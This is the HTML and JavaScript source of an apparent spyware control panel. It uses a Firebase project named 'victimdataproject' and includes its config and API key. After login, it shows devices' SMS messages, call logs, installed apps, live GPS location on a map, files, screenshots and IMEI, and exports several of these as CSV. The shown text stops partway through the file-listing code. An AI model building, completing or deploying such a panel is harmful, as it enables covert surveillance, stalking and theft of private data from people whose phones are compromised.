<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" integrity="sha256-kLaT2GOSpHechhsozzB+flnD+zUyjE2LlfWPgU04xyI=" crossorigin=""/>
    <style>
        body {
            display: flex;
            min-height: 100vh;
            flex-direction: column;
        }
        .sidebar {
            width: 280px;
            min-height: 100vh;
            position: fixed;
            top: 0;
            left: 0;
            bottom: 0;
            z-index: 100;
            padding: 48px 0 0; /*  Height of topbar */
            box-shadow: inset -1px 0 0 rgba(0, 0, 0, .1);
        }
        .main-content {
            margin-left: 280px;
            padding: 20px;
            padding-top: 76px; /* Height of topbar + some padding */
            width: calc(100% - 280px);
        }
        .topbar {
            height: 56px;
            position: fixed;
            top: 0;
            right: 0;
            left: 280px; /* Width of sidebar */
            z-index: 99;
        }
        .sidebar .nav-link {
            font-weight: 500;
            color: var(--bs-light); /* Or adjust for dark mode */
        }
        .sidebar .nav-link .fa-fw {
            width: 1.25em;
        }
        .sidebar .nav-link:hover, .sidebar .nav-link.active {
            color: var(--bs-primary); /* Or adjust */
            background-color: rgba(var(--bs-primary-rgb), 0.1);
        }
        .sidebar-sticky {
            position: relative;
            top: 0;
            height: calc(100vh - 48px);
            padding-top: .5rem;
            overflow-x: hidden;
            overflow-y: auto; /* Scrollable contents if long */
        }
        .card-body-scrollable {
            max-height: 400px;
            overflow-y: auto;
        }
        .status-badge {
            font-size: 0.8em;
        }
        .status-online { background-color: #28a745; }
        .status-offline { background-color: #dc3545; }
        .status-unknown { background-color: #6c757d; }

        #map { height: 450px; width: 100%; border-radius: 0.375rem; }

        /* Mobile adjustments */
        @media (max-width: 767.98px) {
            .sidebar {
                transform: translateX(-100%);
                transition: transform 0.3s ease-in-out;
            }
            .sidebar.open {
                transform: translateX(0);
            }
            .main-content {
                margin-left: 0;
                width: 100%;
            }
            .topbar {
                left: 0; /* Topbar spans full width on mobile */
            }
            .sidebar-toggler {
                display: block !important;
            }
        }
        .sidebar-toggler { display: none; }

        /* Login page styling */
        #login-page {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #212529; /* Dark background for login */
        }
        #login-form-container {
            width: 100%;
            max-width: 400px;
            padding: 2rem;
            background-color: #343a40; /* Darker card */
            border-radius: 0.5rem;
            box-shadow: 0 0.5rem 1rem rgba(0,0,0,0.15);
        }
        .screenshot-img {
            max-width: 150px;
            max-height: 150px;
            object-fit: cover;
            border-radius: 0.25rem;
            margin: 5px;
        }
        .file-icon {
            font-size: 2rem;
            margin-right: 10px;
        }
    </style>
</head>
<body>

    <!-- Login Page -->
    <div id="login-page">
        <div id="login-form-container">
            <h2 class="text-center text-light mb-4">Admin Login</h2>
            <form id="login-form">
                <div class="mb-3">
                    <label for="email" class="form-label text-light">Email address</label>
                    <input type="email" class="form-control" id="email" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label text-light">Password</label>
                    <input type="password" class="form-control" id="password" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Login</button>
                <div id="login-error" class="text-danger mt-3 text-center"></div>
            </form>
        </div>
    </div>

    <!-- Dashboard -->
    <div id="dashboard-page" class="d-none">
        <!-- Topbar -->
        <header class="navbar navbar-dark sticky-top bg-dark flex-md-nowrap p-0 shadow topbar">
            <button class="navbar-toggler d-md-none collapsed border-0 m-2 sidebar-toggler" type="button" aria-controls="sidebarMenu" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <a class="navbar-brand col-md-3 col-lg-2 me-0 px-3 fs-6" href="#">Admin Panel</a>
            <div class="px-3 text-light">
                <span id="welcome-message">Welcome, User</span> | <span id="selected-device-name" class="fw-bold">No Device Selected</span>
            </div>
            <div class="navbar-nav">
                <div class="nav-item text-nowrap">
                    <button id="logout-button" class="nav-link btn btn-link px-3 text-light">Logout <i class="fas fa-sign-out-alt"></i></button>
                </div>
            </div>
        </header>

        <div class="container-fluid">
            <div class="row">
                <!-- Sidebar -->
                <nav id="sidebarMenu" class="col-md-3 col-lg-2 d-md-block bg-dark sidebar collapse">
                    <div class="position-sticky pt-3 sidebar-sticky">
                        <ul class="nav flex-column">
                            <li class="nav-item">
                                <a class="nav-link active" data-target="device-list-content" href="#">
                                    <i class="fas fa-fw fa-list"></i> Device List
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="sms-logs-content" href="#">
                                    <i class="fas fa-fw fa-comments"></i> SMS Logs
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="call-logs-content" href="#">
                                    <i class="fas fa-fw fa-phone-alt"></i> Call Logs
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="installed-apps-content" href="#">
                                    <i class="fab fa-fw fa-android"></i> Installed Apps
                                </a>
                            </li>
                             <li class="nav-item">
                                <a class="nav-link" data-target="battery-content" href="#">
                                    <i class="fas fa-fw fa-battery-full"></i> Battery
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="location-content" href="#">
                                    <i class="fas fa-fw fa-map-marker-alt"></i> Location
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="files-content" href="#">
                                    <i class="fas fa-fw fa-folder-open"></i> Files
                                </a>
                            </li>
                             <li class="nav-item">
                                <a class="nav-link" data-target="screenshots-content" href="#">
                                    <i class="fas fa-fw fa-camera"></i> Screenshots
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="device-info-content" href="#">
                                    <i class="fas fa-fw fa-info-circle"></i> Device Info
                                </a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" data-target="export-data-content" href="#">
                                    <i class="fas fa-fw fa-file-export"></i> Export Data
                                </a>
                            </li>
                        </ul>
                    </div>
                </nav>

                <!-- Main content -->
                <main class="main-content">
                    <div class="content-section" id="device-list-content">
                        <h2><i class="fas fa-list"></i> Device List</h2>
                        <div class="mb-3">
                            <input type="text" id="device-search" class="form-control" placeholder="Search devices by alias...">
                        </div>
                        <div class="table-responsive">
                            <table class="table table-striped table-hover">
                                <thead>
                                    <tr>
                                        <th>Alias</th>
                                        <th>Status</th>
                                        <th>Last Seen</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody id="device-list-table-body">
                                    <!-- Device rows will be injected here -->
                                </tbody>
                            </table>
                        </div>
                        <div id="no-devices-message" class="alert alert-info d-none">No devices found.</div>
                    </div>

                    <div class="content-section d-none" id="sms-logs-content">
                        <h2><i class="fas fa-comments"></i> SMS Logs <button class="btn btn-sm btn-outline-secondary float-end export-btn" data-type="sms">Export CSV</button></h2>
                        <div class="table-responsive card-body-scrollable">
                            <table class="table table-striped table-hover">
                                <thead><tr><th>Timestamp</th><th>Type</th><th>Sender/Recipient</th><th>Body</th></tr></thead>
                                <tbody id="sms-logs-table-body"></tbody>
                            </table>
                        </div>
                        <div id="no-sms-message" class="alert alert-info mt-3">Select a device to view SMS logs or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="call-logs-content">
                        <h2><i class="fas fa-phone-alt"></i> Call Logs <button class="btn btn-sm btn-outline-secondary float-end export-btn" data-type="calls">Export CSV</button></h2>
                        <div class="table-responsive card-body-scrollable">
                            <table class="table table-striped table-hover">
                                <thead><tr><th>Timestamp</th><th>Type</th><th>Number</th><th>Duration</th></tr></thead>
                                <tbody id="call-logs-table-body"></tbody>
                            </table>
                        </div>
                         <div id="no-calls-message" class="alert alert-info mt-3">Select a device to view Call logs or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="installed-apps-content">
                        <h2><i class="fab fa-android"></i> Installed Apps <button class="btn btn-sm btn-outline-secondary float-end export-btn" data-type="apps">Export CSV</button></h2>
                        <div class="table-responsive card-body-scrollable">
                            <table class="table table-striped table-hover">
                                <thead><tr><th>App Name</th><th>Package Name</th><th>Version</th></tr></thead>
                                <tbody id="installed-apps-table-body"></tbody>
                            </table>
                        </div>
                        <div id="no-apps-message" class="alert alert-info mt-3">Select a device to view Installed Apps or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="battery-content">
                        <h2><i class="fas fa-battery-full"></i> Battery Status</h2>
                        <div id="battery-info-card" class="card">
                            <div class="card-body">
                                <h5 class="card-title">Battery Details</h5>
                                <p id="battery-level">Level: N/A</p>
                                <p id="battery-charging">Charging: N/A</p>
                                <p id="battery-health">Health: N/A</p>
                                <p id="battery-temperature">Temperature: N/A</p>
                            </div>
                        </div>
                        <div id="no-battery-message" class="alert alert-info mt-3">Select a device to view Battery status or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="location-content">
                        <h2><i class="fas fa-map-marker-alt"></i> Location</h2>
                        <div id="map"></div>
                        <div id="location-details" class="mt-2">
                            <p>Latitude: <span id="loc-lat">N/A</span></p>
                            <p>Longitude: <span id="loc-lon">N/A</span></p>
                            <p>Accuracy: <span id="loc-acc">N/A</span></p>
                            <p>Last Update: <span id="loc-time">N/A</span></p>
                        </div>
                        <div id="no-location-message" class="alert alert-info mt-3">Select a device to view Location or no GPS data available.</div>
                    </div>

                    <div class="content-section d-none" id="files-content">
                        <h2><i class="fas fa-folder-open"></i> Files <button class="btn btn-sm btn-outline-secondary float-end export-btn" data-type="files">Export CSV (List)</button></h2>
                        <div id="files-list" class="list-group card-body-scrollable">
                            <!-- File items will be injected here -->
                        </div>
                        <div id="no-files-message" class="alert alert-info mt-3">Select a device to view Files or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="screenshots-content">
                        <h2><i class="fas fa-camera"></i> Screenshots</h2>
                        <div id="screenshots-gallery" class="d-flex flex-wrap">
                            <!-- Screenshot images will be injected here -->
                        </div>
                         <div id="no-screenshots-message" class="alert alert-info mt-3">Select a device to view Screenshots or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="device-info-content">
                        <h2><i class="fas fa-info-circle"></i> Device Info</h2>
                         <div id="device-info-card" class="card">
                            <div class="card-body">
                                <h5 class="card-title">Device Specifications</h5>
                                <p id="info-model">Model: N/A</p>
                                <p id="info-manufacturer">Manufacturer: N/A</p>
                                <p id="info-android-version">Android Version: N/A</p>
                                <p id="info-imei">IMEI: N/A</p>
                                <!-- Add more as needed -->
                            </div>
                        </div>
                        <div id="no-deviceinfo-message" class="alert alert-info mt-3">Select a device to view Device Info or no data available.</div>
                    </div>

                    <div class="content-section d-none" id="export-data-content">
                        <h2><i class="fas fa-file-export"></i> Export Data</h2>
                        <p>Select a device and then use the "Export CSV" buttons available in each section (SMS, Calls, Apps, Files List) to download data.</p>
                        <p>For a full device data export, this feature would typically involve server-side processing or more complex client-side aggregation.</p>
                        <button id="export-all-for-device-btn" class="btn btn-primary" disabled>Export All Data for Selected Device (Not Implemented)</button>
                         <div id="no-export-message" class="alert alert-info mt-3">Select a device to enable export options.</div>
                    </div>
                </main>
            </div>
        </div>
    </div>

    <!-- Bootstrap 5 JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js" integrity="sha256-WBkoXOwTeyKclOHuWtc+i2uENFpDZ9YPdf5Hf+D7ewM=" crossorigin=""></script>
    <!-- Firebase SDK -->
    <script type="module">
        // Firebase v9 Modular SDK
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut as firebaseSignOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
            authDomain: "victimdataproject.firebaseapp.com",
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
            projectId: "victimdataproject",
            storageBucket: "victimdataproject.appspot.com",
            messagingSenderId: "938788267301",
            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        // Global state
        let currentDeviceUID = null;
        let currentDeviceAlias = null;
        let activeDataListenerUnsubscribe = null;
        let activeSectionId = 'device-list-content'; // Default section
        let devicesDataCache = {}; // Cache for device list data for search
        let map; // Leaflet map instance
        let marker; // Leaflet marker instance

        // DOM Elements
        const loginPage = document.getElementById('login-page');
        const dashboardPage = document.getElementById('dashboard-page');
        const loginForm = document.getElementById('login-form');
        const loginError = document.getElementById('login-error');
        const logoutButton = document.getElementById('logout-button');
        const welcomeMessage = document.getElementById('welcome-message');
        const selectedDeviceNameDisplay = document.getElementById('selected-device-name');
        const sidebarLinks = document.querySelectorAll('#sidebarMenu .nav-link');
        const contentSections = document.querySelectorAll('.main-content .content-section');
        const deviceSearchInput = document.getElementById('device-search');
        const sidebarToggler = document.querySelector('.sidebar-toggler');
        const sidebarMenu = document.getElementById('sidebarMenu');

        // --- AUTHENTICATION ---
        onAuthStateChanged(auth, (user) => {
            if (user) {
                // User is signed in
                loginPage.classList.add('d-none');
                dashboardPage.classList.remove('d-none');
                welcomeMessage.textContent = `Welcome, ${user.email}`;
                initDashboard();
            } else {
                // User is signed out
                loginPage.classList.remove('d-none');
                dashboardPage.classList.add('d-none');
                if (activeDataListenerUnsubscribe) activeDataListenerUnsubscribe();
                currentDeviceUID = null;
                currentDeviceAlias = null;
                selectedDeviceNameDisplay.textContent = 'No Device Selected';
                // Potentially clear map and other states if needed
                if(map) {
                    map.remove(); // Clean up map instance
                    map = null;
                    marker = null;
                }
            }
        });

        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            loginError.textContent = '';

            signInWithEmailAndPassword(auth, email, password)
                .then((userCredential) => {
                    // Signed in
                })
                .catch((error) => {
                    loginError.textContent = error.message;
                });
        });

        logoutButton.addEventListener('click', () => {
            firebaseSignOut(auth).catch(error => console.error("Logout error:", error));
        });

        // --- DASHBOARD INITIALIZATION & NAVIGATION ---
        function initDashboard() {
            loadDeviceList();
            navigateToSection(activeSectionId); // Load default or last active section
            if (currentDeviceUID && currentDeviceAlias) {
                 selectedDeviceNameDisplay.textContent = `Device: ${currentDeviceAlias}`;
            } else {
                selectedDeviceNameDisplay.textContent = 'No Device Selected';
            }
        }
        
        sidebarToggler.addEventListener('click', () => {
            sidebarMenu.classList.toggle('open');
             // For Bootstrap 5 Offcanvas, you would use:
            // const offcanvas = new bootstrap.Offcanvas(sidebarMenu);
            // offcanvas.toggle();
            // This custom toggle is for the provided CSS. If using Bootstrap Offcanvas, replace.
        });

        sidebarLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const targetId = link.getAttribute('data-target');
                navigateToSection(targetId);

                sidebarLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
                
                // Close sidebar on mobile after click
                if (window.innerWidth < 768 && sidebarMenu.classList.contains('open')) {
                    sidebarMenu.classList.remove('open');
                }
            });
        });

        function navigateToSection(sectionId) {
            activeSectionId = sectionId;
            contentSections.forEach(section => {
                section.classList.add('d-none');
            });
            document.getElementById(sectionId).classList.remove('d-none');

            // Clear previous data listener
            if (activeDataListenerUnsubscribe) {
                activeDataListenerUnsubscribe();
                activeDataListenerUnsubscribe = null;
            }
            
            // Clear content of sections that depend on device selection
            if (sectionId !== 'device-list-content') {
                 clearDeviceSpecificSections();
            }


            if (sectionId === 'device-list-content') {
                // Device list is loaded by initDashboard/loadDeviceList separately
            } else if (currentDeviceUID) {
                document.getElementById(`no-${sectionId.replace('-content', '')}-message`)?.classList.add('d-none');
                switch (sectionId) {
                    case 'sms-logs-content': loadSmsLogs(currentDeviceUID); break;
                    case 'call-logs-content': loadCallLogs(currentDeviceUID); break;
                    case 'installed-apps-content': loadInstalledApps(currentDeviceUID); break;
                    case 'battery-content': loadBatteryInfo(currentDeviceUID); break;
                    case 'location-content': loadLocationData(currentDeviceUID); break;
                    case 'files-content': loadFiles(currentDeviceUID); break;
                    case 'screenshots-content': loadScreenshots(currentDeviceUID); break;
                    case 'device-info-content': loadDeviceInfo(currentDeviceUID); break;
                    case 'export-data-content': 
                        document.getElementById('no-export-message').classList.add('d-none');
                        document.getElementById('export-all-for-device-btn').disabled = false;
                        break;
                }
            } else if (sectionId !== 'export-data-content' && sectionId !== 'device-list-content') {
                // Show "select device" message for sections that require a device
                const noDataMsg = document.getElementById(`no-${sectionId.replace('-content', '')}-message`);
                if (noDataMsg) {
                    noDataMsg.textContent = 'Please select a device from the Device List to view data.';
                    noDataMsg.classList.remove('d-none');
                }
                if (sectionId === 'location-content' && map) { // Clear map if no device selected
                    map.setView([0,0], 2);
                    if(marker) marker.remove();
                    document.getElementById('loc-lat').textContent = 'N/A';
                    document.getElementById('loc-lon').textContent = 'N/A';
                    document.getElementById('loc-acc').textContent = 'N/A';
                    document.getElementById('loc-time').textContent = 'N/A';
                }
            } else if (sectionId === 'export-data-content') {
                 document.getElementById('no-export-message').classList.remove('d-none');
                 document.getElementById('export-all-for-device-btn').disabled = true;
            }
        }
        
        function clearDeviceSpecificSections() {
            // SMS
            document.getElementById('sms-logs-table-body').innerHTML = '';
            document.getElementById('no-sms-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            // Calls
            document.getElementById('call-logs-table-body').innerHTML = '';
            document.getElementById('no-calls-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            // Apps
            document.getElementById('installed-apps-table-body').innerHTML = '';
            document.getElementById('no-apps-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            // Battery
            document.getElementById('battery-level').textContent = 'Level: N/A';
            document.getElementById('battery-charging').textContent = 'Charging: N/A';
            document.getElementById('battery-health').textContent = 'Health: N/A';
            document.getElementById('battery-temperature').textContent = 'Temperature: N/A';
            document.getElementById('no-battery-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            // Location - map is handled in navigateToSection
            document.getElementById('loc-lat').textContent = 'N/A';
            document.getElementById('loc-lon').textContent = 'N/A';
            document.getElementById('loc-acc').textContent = 'N/A';
            document.getElementById('loc-time').textContent = 'N/A';
            document.getElementById('no-location-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            // Files
            document.getElementById('files-list').innerHTML = '';
            document.getElementById('no-files-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            // Screenshots
            document.getElementById('screenshots-gallery').innerHTML = '';
            document.getElementById('no-screenshots-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
            // Device Info
            document.getElementById('info-model').textContent = 'Model: N/A';
            document.getElementById('info-manufacturer').textContent = 'Manufacturer: N/A';
            document.getElementById('info-android-version').textContent = 'Android Version: N/A';
            document.getElementById('info-imei').textContent = 'IMEI: N/A';
            document.getElementById('no-deviceinfo-message').classList.remove('d-none').textContent = 'Select a device or no data available.';
        }

        // --- DATA LOADING FUNCTIONS ---

        /**
         * Loads and displays the list of devices.
         */
        function loadDeviceList() {
            const devicesRef = ref(db, 'devices/');
            onValue(devicesRef, (snapshot) => {
                const devices = snapshot.val();
                const tbody = document.getElementById('device-list-table-body');
                tbody.innerHTML = ''; // Clear existing rows
                devicesDataCache = devices || {};

                if (devices) {
                    document.getElementById('no-devices-message').classList.add('d-none');
                    renderDeviceList(devices);
                } else {
                    document.getElementById('no-devices-message').classList.remove('d-none');
                }
            }, (error) => {
                console.error("Error loading device list:", error);
                document.getElementById('no-devices-message').classList.remove('d-none').textContent = 'Error loading devices.';
            });
        }
        
        /**
         * Renders the device list table based on provided data.
         * @param {object} devices - The devices data from Firebase.
         */
        function renderDeviceList(devices) {
            const tbody = document.getElementById('device-list-table-body');
            tbody.innerHTML = '';
            const searchTerm = deviceSearchInput.value.toLowerCase();

            Object.keys(devices).forEach(uid => {
                const device = devices[uid];
                if (device.alias && device.alias.toLowerCase().includes(searchTerm)) {
                    const row = tbody.insertRow();
                    row.insertCell().textContent = device.alias || 'N/A';
                    
                    const statusCell = row.insertCell();
                    const statusBadge = document.createElement('span');
                    statusBadge.classList.add('badge', 'status-badge');
                    statusBadge.textContent = device.status || 'unknown';
                    if (device.status === 'online') statusBadge.classList.add('status-online');
                    else if (device.status === 'offline') statusBadge.classList.add('status-offline');
                    else statusBadge.classList.add('status-unknown');
                    statusCell.appendChild(statusBadge);

                    row.insertCell().textContent = formatTimeAgo(device.last_seen);
                    
                    const actionsCell = row.insertCell();
                    const selectButton = document.createElement('button');
                    selectButton.classList.add('btn', 'btn-sm', 'btn-primary');
                    selectButton.innerHTML = '<i class="fas fa-eye"></i> View';
                    selectButton.onclick = () => {
                        currentDeviceUID = uid;
                        currentDeviceAlias = device.alias;
                        selectedDeviceNameDisplay.textContent = `Device: ${device.alias}`;
                        // Navigate to the current active section to refresh its data for the new device
                        // Or default to a specific section like SMS logs if preferred after selection
                        const currentActiveSidebarLink = document.querySelector('#sidebarMenu .nav-link.active');
                        let targetSectionAfterSelect = 'sms-logs-content'; // Default after selection
                        if (currentActiveSidebarLink && currentActiveSidebarLink.dataset.target !== 'device-list-content') {
                            targetSectionAfterSelect = currentActiveSidebarLink.dataset.target;
                        }
                        
                        sidebarLinks.forEach(l => l.classList.remove('active'));
                        document.querySelector(`#sidebarMenu .nav-link[data-target="${targetSectionAfterSelect}"]`).classList.add('active');
                        navigateToSection(targetSectionAfterSelect);
                    };
                    actionsCell.appendChild(selectButton);
                }
            });
            if (tbody.rows.length === 0 && Object.keys(devices).length > 0) {
                 tbody.innerHTML = '<tr><td colspan="4" class="text-center">No devices match your search.</td></tr>';
            } else if (tbody.rows.length === 0) {
                 document.getElementById('no-devices-message').classList.remove('d-none');
            }
        }
        
        deviceSearchInput.addEventListener('keyup', () => {
            renderDeviceList(devicesDataCache);
        });


        /**
         * Generic data loader for simple table structures.
         * @param {string} deviceId - The UID of the device.
         * @param {string} dataPath - The Firebase path relative to the device (e.g., 'messages').
         * @param {string} tableBodyId - The ID of the HTML table body element.
         * @param {string} noDataMessageId - The ID of the 'no data' message element.
         * @param {function} rowRenderer - Function to render a single row (receives item data and item key).
         * @param {Array<object>} [exportDataStore] - Array to store data for export.
         */
        function loadGenericTableData(deviceId, dataPath, tableBodyId, noDataMessageId, rowRenderer, exportDataStore = null) {
            const dataRef = ref(db, `devices/${deviceId}/${dataPath}`);
            const tableBody = document.getElementById(tableBodyId);
            const noDataMsg = document.getElementById(noDataMessageId);
            tableBody.innerHTML = ''; // Clear previous data
            if (exportDataStore) exportDataStore.length = 0; // Clear export data store

            activeDataListenerUnsubscribe = onValue(dataRef, (snapshot) => {
                const data = snapshot.val();
                tableBody.innerHTML = ''; // Clear on new data
                if (exportDataStore) exportDataStore.length = 0;

                if (data && Object.keys(data).length > 0) {
                    noDataMsg.classList.add('d-none');
                    Object.keys(data).forEach(key => {
                        const item = data[key];
                        const row = rowRenderer(item, key);
                        if (row) tableBody.appendChild(row);
                        if (exportDataStore) { // Prepare data for export
                             // Flatten or select specific fields for CSV
                            const exportItem = {};
                            if (item.timestamp) exportItem.Timestamp = new Date(item.timestamp).toLocaleString();
                            if (item.type) exportItem.Type = item.type;
                            if (dataPath === 'messages') {
                                exportItem.Contact = item.sender === 'self' ? 'Me' : item.sender;
                                exportItem.Body = item.body;
                            } else if (dataPath === 'calls') {
                                exportItem.Number = item.number;
                                exportItem.Duration = item.duration;
                            } else if (dataPath === 'apps') {
                                exportItem.AppName = item.name;
                                exportItem.PackageName = item.packageName;
                                exportItem.Version = item.version;
                            }
                            // Add more specific adaptations if needed
                            if(Object.keys(exportItem).length > 0) exportDataStore.push(exportItem);
                            else exportDataStore.push(item); // Fallback
                        }
                    });
                } else {
                    noDataMsg.classList.remove('d-none');
                    noDataMsg.textContent = 'No data available for this section.';
                }
            }, (error) => {
                console.error(`Error loading ${dataPath}:`, error);
                noDataMsg.classList.remove('d-none');
                noDataMsg.textContent = `Error loading data: ${error.message}`;
            });
        }
        
        let smsExportData = [];
        function loadSmsLogs(deviceId) {
            loadGenericTableData(deviceId, 'messages', 'sms-logs-table-body', 'no-sms-message', (item) => {
                const row = document.createElement('tr');
                row.insertCell().textContent = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'N/A';
                row.insertCell().textContent = item.type || 'N/A'; // e.g., inbox, sent
                row.insertCell().textContent = item.sender === 'self' ? 'Me' : (item.sender || item.address || 'N/A');
                row.insertCell().textContent = item.body || 'N/A';
                return row;
            }, smsExportData);
        }

        let callsExportData = [];
        function loadCallLogs(deviceId) {
            loadGenericTableData(deviceId, 'calls', 'call-logs-table-body', 'no-calls-message', (item) => {
                const row = document.createElement('tr');
                row.insertCell().textContent = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'N/A';
                row.insertCell().textContent = item.type || 'N/A'; // e.g., incoming, outgoing, missed
                row.insertCell().textContent = item.number || 'N/A';
                row.insertCell().textContent = item.duration || 'N/A';
                return row;
            }, callsExportData);
        }

        let appsExportData = [];
        function loadInstalledApps(deviceId) {
            loadGenericTableData(deviceId, 'apps', 'installed-apps-table-body', 'no-apps-message', (item) => {
                const row = document.createElement('tr');
                row.insertCell().textContent = item.name || 'N/A';
                row.insertCell().textContent = item.packageName || 'N/A';
                row.insertCell().textContent = item.version || 'N/A';
                return row;
            }, appsExportData);
        }
        
        function loadBatteryInfo(deviceId) {
            const batteryRef = ref(db, `devices/${deviceId}/battery`);
            const noDataMsg = document.getElementById('no-battery-message');
            activeDataListenerUnsubscribe = onValue(batteryRef, (snapshot) => {
                const data = snapshot.val();
                if (data) {
                    noDataMsg.classList.add('d-none');
                    document.getElementById('battery-level').textContent = `Level: ${data.level || 'N/A'}%`;
                    document.getElementById('battery-charging').textContent = `Charging: ${data.is_charging ? 'Yes' : 'No'}`;
                    document.getElementById('battery-health').textContent = `Health: ${data.health || 'N/A'}`;
                    document.getElementById('battery-temperature').textContent = `Temperature: ${data.temperature || 'N/A'}°C`;
                    document.getElementById('battery-info-card').classList.remove('d-none');
                } else {
                    noDataMsg.classList.remove('d-none');
                    document.getElementById('battery-info-card').classList.add('d-none');
                }
            }, (error) => {
                console.error("Error loading battery info:", error);
                noDataMsg.classList.remove('d-none').textContent = `Error loading data: ${error.message}`;
                document.getElementById('battery-info-card').classList.add('d-none');
            });
        }
        
        function initMap() {
            if (!map) { // Initialize map only once
                map = L.map('map').setView([20, 0], 2); // Default view
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                }).addTo(map);
            }
        }

        function loadLocationData(deviceId) {
            initMap(); // Ensure map is initialized
            const gpsRef = ref(db, `devices/${deviceId}/gps`);
            const noDataMsg = document.getElementById('no-location-message');
            
            activeDataListenerUnsubscribe = onValue(gpsRef, (snapshot) => {
                const data = snapshot.val();
                if (data && data.latitude && data.longitude) {
                    noDataMsg.classList.add('d-none');
                    document.getElementById('location-details').classList.remove('d-none');
                    
                    const latLng = [data.latitude, data.longitude];
                    map.setView(latLng, 15);
                    if (marker) {
                        marker.setLatLng(latLng);
                    } else {
                        marker = L.marker(latLng).addTo(map);
                    }
                    marker.bindPopup(`<b>${currentDeviceAlias || 'Device'}</b><br>Accuracy: ${data.accuracy || 'N/A'}m`).openPopup();

                    document.getElementById('loc-lat').textContent = data.latitude;
                    document.getElementById('loc-lon').textContent = data.longitude;
                    document.getElementById('loc-acc').textContent = data.accuracy ? `${data.accuracy}m` : 'N/A';
                    document.getElementById('loc-time').textContent = data.timestamp ? new Date(data.timestamp).toLocaleString() : 'N/A';
                } else {
                    noDataMsg.classList.remove('d-none');
                    document.getElementById('location-details').classList.add('d-none');
                     map.setView([20, 0], 2); // Reset map view if no data
                    if(marker) {
                        marker.remove();
                        marker = null;
                    }
                }
            }, (error) => {
                console.error("Error loading location data:", error);
                noDataMsg.classList.remove('d-none').textContent = `Error loading data: ${error.message}`;
            });
        }

        let filesExportData = [];
        function loadFiles(deviceId) {
            const filesRef = ref(db, `devices/${deviceId}/files`);
            const filesListEl = document.getElementById('files-list');
            const noDataMsg = document.getElementById('no-files-message');
            filesListEl.innerHTML = '';
            filesExportData.length = 0;

            activeDataListenerUnsubscribe = onValue(filesRef, (snapshot) => {
                const files = snapshot.val();
                filesListEl.innerHTML = '';
                 filesExportData.length = 0;
                if (files && Object.keys(files).length > 0) {
                    noDataMsg.classList.add('d-none');
                    Object.values(files).forEach(file => {
                        const fileItem = document.createElement('div');
                        fileItem.classList.add('list-group-item', 'd-flex', 'justify-content-between', 'align-items-center');
                        
                        let iconClass = 'fa-file'; // Default icon
                        if (file.type) {
